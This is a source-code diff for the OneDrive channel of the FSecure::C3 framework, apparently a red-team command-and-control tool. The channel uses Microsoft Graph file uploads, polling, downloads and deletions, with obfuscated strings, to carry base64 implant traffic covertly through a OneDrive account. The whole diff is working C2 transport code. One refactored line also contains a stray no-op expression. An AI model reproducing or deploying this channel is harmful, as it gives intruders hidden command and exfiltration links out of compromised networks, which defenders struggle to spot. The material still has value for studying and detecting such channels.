@@ -23,6 +23,8 @@ FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OneDrive365RestFile(Byte
 	, m_Password{ arguments.Read<SecureString>() }
 	, m_ClientKey{ arguments.Read<SecureString>() }
 {
+	FSecure::Utils::DisallowChars({ m_InboundDirectionName, m_OutboundDirectionName }, OBF(R"(;/?:@&=+$,)"));
+
 	// Obtain proxy information and store it in the HTTP configuration.
 	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
 		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);
@@ -39,25 +41,19 @@ size_t FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnSendToChannel(B
 	try
 	{
 		// Construct the HTTP request
-		auto URLwithFilename = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/") + m_OutboundDirectionName + OBF("-") + FSecure::Utils::GenerateRandomString(20) + OBF(".txt") + OBF(":/content");
-		HttpClient webClient(Convert<Utf16>(URLwithFilename), m_ProxyConfig);
+		auto URLwithFilename = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/") + m_OutboundDirectionName + OBF("-") + FSecure::Utils::GenerateRandomString(20) + OBF(".json") + OBF(":/content");
+		auto webClient = HttpClient{ Convert<Utf16>(URLwithFilename), m_ProxyConfig };
+		auto request = CreateAuthRequest(Method::PUT);
 
-		HttpRequest request;
-		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
-		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
-		request.m_Method = Method::PUT;
-
-		auto chunkSize = std::min<size_t>(data.size(), 3 * (1024 * 1024 - 64)); // Max 4 MB can be sent. base64 will expand data by 4/3. 256 bytes are reserved for json schema.
-		json fileData;
+		auto chunkSize = std::min<size_t>(data.size(), 3 * (1024 * 1024 - 64)); // Send max 4 MB. base64 will expand data by 4/3. 256 bytes are reserved for json schema.
+		auto fileData = json{};
 		fileData[OBF("epoch_time")] = FSecure::Utils::TimeSinceEpoch();
 		fileData[OBF("high_res_time")] = GetTickCount64();
 		fileData[OBF("data")] = cppcodec::base64_rfc4648::encode(&data.front(), chunkSize);
-		std::string body = fileData.dump();
 
+		auto body = fileData.dump();
 		request.SetData(OBF(L"text/plain"), { body.begin(), body.end() });
-
-		auto resp = webClient.Request(request);
-		EvaluateResponse(resp);
+		EvaluateResponse(webClient.Request(request));
 
 		return chunkSize;
 	}
@@ -74,74 +70,28 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365R
 	if (s_TimePoint.load() > std::chrono::steady_clock::now())
 		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));
 
-	std::vector<ByteVector> packets;
+	auto packets = std::vector<ByteVector>{};
 	try
 	{
-		// Construct request to get files.
-		// The OneDrive API does have a search function that helps finding items by m_InboundDirectionName.
-		// However, this function does not appear to update in real time to reflect the status of what is actually in folders.
-		// Therefore, we need to use a standard directory listing, and manually check the filenames to determine which files to request.
-		// This directory listing fetches up to 1000 files.
-		HttpClient webClient(OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children?top=1000"), m_ProxyConfig);
-		HttpRequest request;
-		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
-		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
-
+		auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children?top=1000&filter=startswith(name,'") + Convert<Utf16>(m_InboundDirectionName) + OBF(L"')"), m_ProxyConfig };
+		auto request = CreateAuthRequest(); HttpRequest{};
 		auto resp = webClient.Request(request);
 		EvaluateResponse(resp);
 
-		json taskDataAsJSON;
-		try
-		{
-			taskDataAsJSON = json::parse(resp.GetData());
-		}
-		catch (json::parse_error)
-		{
-			Log({ OBF("Failed to parse the list of received files."), LogMessage::Severity::Error });
-			return {};
-		}
+		auto taskDataAsJSON = json::parse(resp.GetData());
 
-		//first iterate over the json and populate an array of the files we want.
-		std::vector<json> elements;
+		// First iterate over the json and populate an array of the files we want.
+		auto elements = std::vector<json>{};
 		for (auto& element : taskDataAsJSON.at(OBF("value")))
 		{
-			// Obtain subject and task ID.
-			std::string filename = element.at(OBF("name")).get<std::string>();
-			std::string id = element.at(OBF("id")).get<std::string>();
-
-
-			// Verify that the full subject and ID were obtained.  If not, ignore.
-			if (filename.empty() || id.empty())
-				continue;
-
-			// Check the direction component is at the start of name.
-			if (filename.find(m_InboundDirectionName))
-				continue;
-
 			//download the file
-			std::string downloadUrl = element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>();
-			HttpClient webClientFile(Convert<Utf16>(downloadUrl), m_ProxyConfig);
-			HttpRequest fileRequest;
+			auto  webClientFile = HttpClient{ Convert<Utf16>(element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>()), m_ProxyConfig };
+			auto resp = webClientFile.Request(request);
+			EvaluateResponse(resp);
 
-			fileRequest.SetHeader(Header::Authorization, Convert<Utf16>(auth));
-
-			auto fileResp = webClientFile.Request(fileRequest);
-			std::string fileAsString;
-
-			if (fileResp.GetStatusCode() == StatusCode::OK)
-			{
-				auto data = fileResp.GetData();
-				fileAsString = std::string{ data.begin(), data.end() };
-			}
-			else
-			{
-
-				Log({ OBF("Error request download url, got HTTP code ") + std::to_string(fileResp.GetStatusCode()), LogMessage::Severity::Error });
-				return {}; //or continue??
-			}
-			json j = json::parse(fileAsString);
-			j[OBF("id")] = id;
-			elements.push_back(j);
+			auto j = json::parse(resp.GetData());
+			j[OBF("id")] = element.at(OBF("id"));
+			elements.push_back(std::move(j));
 		}
 
 		//now sort and re-iterate over them.
@@ -151,25 +101,10 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365R
 
 		for(auto &element : elements)
 		{
-			std::string id = element.at(OBF("id")).get<std::string>();
-			std::string base64Data = element.at(OBF("data")).get<std::string>();
-			try
-			{
-				packets.push_back(cppcodec::base64_rfc4648::decode(base64Data));
-				RemoveFile(id);
-			}
-			catch (const cppcodec::parse_error& exception)
-			{
-				Log({ OBF("Error decoding task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
-				return {};
-			}
-			catch (std::exception& exception)
-			{
-				Log({ OBF("Caught a std::exception when processing file #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
-				return {};
-			}
+			auto id = element.at(OBF("id")).get<std::string>();
+			packets.push_back(cppcodec::base64_rfc4648::decode(element.at(OBF("data")).get<std::string>()));
+			RemoveFile(id);
 		}
-
 	}
 	catch (std::exception& exception)
 	{
@@ -180,33 +115,43 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365R
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveFile(std::string const& id)
+{
+	auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/items/") + Convert<Utf16>(id), m_ProxyConfig };
+	auto request = CreateAuthRequest(Method::DEL);
+	auto resp = webClient.Request(request);
+
+	if (resp.GetStatusCode() > 205)
+		throw std::runtime_error{ OBF("RemoveFile() Error. Task ") + id + OBF(" could not be deleted. HTTP response:") + std::to_string(resp.GetStatusCode()) };
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveAllFiles(ByteView)
 {
-	try
-	{
-		HttpClient webClient(OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children"), m_ProxyConfig);
-		HttpRequest request;
-		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
-		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
-
+		auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children"), m_ProxyConfig };
+		auto request = CreateAuthRequest();
 		auto resp = webClient.Request(request);
-
-		if (resp.GetStatusCode() != StatusCode::OK)
+		try
 		{
-			Log({ OBF("RemoveAllFiles() Error.  Files could not be deleted.  Confirm access and refresh tokens are correct."), LogMessage::Severity::Error });
+			EvaluateResponse(resp);
+		}
+		catch (const std::exception & exception)
+		{
+			Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + exception.what(), LogMessage::Severity::Error });
 			return {};
 		}
 
-		auto taskDataAsJSON = nlohmann::json::parse(resp.GetData());
-
 		// For each task (under the "value" key), extract the ID, and send a request to delete the task.
+		auto taskDataAsJSON = nlohmann::json::parse(resp.GetData());
 		for (auto& element : taskDataAsJSON.at(OBF("value")))
-			RemoveFile(element.at(OBF("id")).get<std::string>());
-	}
-	catch (std::exception& exception)
-	{
-		Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") +exception.what(), LogMessage::Severity::Warning });
-	}
+			try
+			{
+				RemoveFile(element.at(OBF("id")).get<std::string>());
+			}
+			catch (const std::exception& exception)
+			{
+				Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + exception.what(), LogMessage::Severity::Error });
+			}
 
 	return {};
 }
@@ -217,12 +162,10 @@ void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken(
 	try
 	{
 		//Token endpoint
-		HttpClient webClient(OBF(L"https://login.windows.net/organizations/oauth2/v2.0/token"), m_ProxyConfig);
+		auto webClient = HttpClient{ OBF(L"https://login.windows.net/organizations/oauth2/v2.0/token"), m_ProxyConfig };
 
-		HttpRequest request; // default request is GET
-		request.m_Method = Method::POST;
+		auto request = HttpRequest{ Method::POST };
 		request.SetHeader(Header::ContentType, OBF(L"application/x-www-form-urlencoded; charset=utf-16"));
-		json data;
 
 		auto requestBody = SecureString{};
 		requestBody += OBF("grant_type=password");
@@ -236,12 +179,9 @@ void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken(
 
 		request.SetData(ContentType::ApplicationXWwwFormUrlencoded, { requestBody.begin(), requestBody.end() });
 		auto resp = webClient.Request(request);
+		EvaluateResponse(resp, false);
 
-		if (resp.GetStatusCode() == StatusCode::OK)
-			data = json::parse(resp.GetData());
-		else
-			throw std::runtime_error{ OBF("Refresh access token request - non-200 status code was received: ") + std::to_string(resp.GetStatusCode()) };
-
+		auto data = json::parse(resp.GetData());
 		m_Token = data[OBF("access_token")].get<std::string>();
 	}
 	catch (std::exception& exception)
@@ -250,29 +190,10 @@ void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken(
 	}
 }
 
-
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveFile(std::string const& id)
-{
-	std::wstring url = OBF(L"https://graph.microsoft.com/v1.0/me/drive/items/") + Convert<Utf16>(id);
-	HttpClient webClient(url, m_ProxyConfig);
-	HttpRequest request;
-
-	auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
-	request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
-	request.m_Method = Method::DEL;
-	auto resp = webClient.Request(request);
-
-	if (resp.GetStatusCode() > 205)
-	{
-		Log({ OBF("RemoveFile() Error. Task could not be deleted. HTTP response:") + std::to_string(resp.GetStatusCode()), LogMessage::Severity::Error });
-	}
-}
-
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnRunCommand(ByteView command)
 {
-	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
+	auto commandCopy = command; // Each read moves ByteView. CommandCoppy is needed  for default.
 	switch (command.Read<uint16_t>())
 	{
 	case 0:
@@ -283,35 +204,40 @@ FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnRu
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::EvaluateResponse(WinHttp::HttpResponse const& resp)
+void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::EvaluateResponse(WinHttp::HttpResponse const& resp, bool tryRefreshingToken)
 {
+
 	if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
 		return;
 
 	if (resp.GetStatusCode() == StatusCode::TooManyRequests) // break and set sleep time.
 	{
-		s_TimePoint = std::chrono::steady_clock::now() + FSecure::Utils::GenerateRandomValue(10s, 20s);
+		auto retryAfterHeader = resp.GetHeader(Header::RetryAfter);
+		auto delay = !retryAfterHeader.empty() ? stoul(retryAfterHeader) : FSecure::Utils::GenerateRandomValue(10, 20);
+		s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ delay };
 		throw std::runtime_error{ OBF("Too many requests") };
 	}
 
 	if (resp.GetStatusCode() == StatusCode::Unauthorized)
 	{
-		RefreshAccessToken();
+		if (tryRefreshingToken)
+			RefreshAccessToken();
 		throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };
 	}
 
 	if (resp.GetStatusCode() == StatusCode::BadRequest)
-	{
-		RefreshAccessToken();
 		throw std::runtime_error{ OBF("Bad Request") };
-	}
 
 	throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(resp.GetStatusCode()) };
-
 }
 
-
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+FSecure::WinHttp::HttpRequest FSecure::C3::Interfaces::Channels::OneDrive365RestFile::CreateAuthRequest(WinHttp::Method method)
+{
+	auto request = HttpRequest{ method };
+	request.SetHeader(Header::Authorization, Convert<Utf16>(OBF_SEC("Bearer ") + m_Token.Decrypt()));
+	return request;
+}
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::ByteView FSecure::C3::Interfaces::Channels::OneDrive365RestFile::GetCapability()
@@ -361,13 +287,12 @@ FSecure::ByteView FSecure::C3::Interfaces::Channels::OneDrive365RestFile::GetCap
 	"commands":
 	[
 		{
-			"name": "Remove all files",
+			"name": "Clear channel",
 			"id": 0,
-			"description": "Clearing old files from server may increase bandwidth",
+			"description": "Clearing old files from server. May increase bandwidth",
 			"arguments": []
 		}
 	]
 }
 )_";
 }
-
